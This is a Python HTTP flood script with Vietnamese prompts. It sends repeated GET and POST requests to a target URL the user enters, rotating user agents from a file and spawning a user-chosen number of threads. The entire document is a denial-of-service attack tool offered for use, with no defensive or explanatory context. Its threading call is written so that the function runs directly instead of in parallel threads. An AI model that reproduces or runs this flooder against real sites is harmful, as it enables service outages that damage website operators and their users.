import requests
import threading
import random
import time
import sys

def attack(target):
    count = 0
    user_agents = [line.strip("\n") for line in open("list/useragents.txt", "r", encoding="utf-8").readlines()]
    for ua in user_agents:
        count += 1
        headers = {
            "User-Agent": str(ua),
            "Cache-Control": "no-cache",
            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Keep-Alive": str(random.randint(110, 160)),
            "Connection": "keep-alive",
        }
        try: 
            r = requests.get(url=target, headers=headers)
            if r.status_code == 405:
                r = requests.post(url=target, headers=headers)
            elif r.status_code == 429:
                print("[!] 429 code encountered, cooling down for 30 seconds.")
                time.sleep(30)
            elif r.status_code == 404:
                print("[!] Khong thay may chu. Thoat...")
                sys.exit()
            print(f"[+] Request #{count} completed.")
        except Exception as e:
            raise e
        
def main():
    target = input("[!] Nhap dia chi dich: ")
    threads = input("[!] Nhap Vào so thread? (eg. 500) > ")
    print("[!] Chương trinh bắt đâu trong vai giay")
    print("[!] De thoat: Nhan phim Ctrl + C")
    time.sleep(5)
    for i in range(int(threads)):
        thread = threading.Thread(target=attack(target=target))
        thread.start()

if __name__ == "__main__":
    main()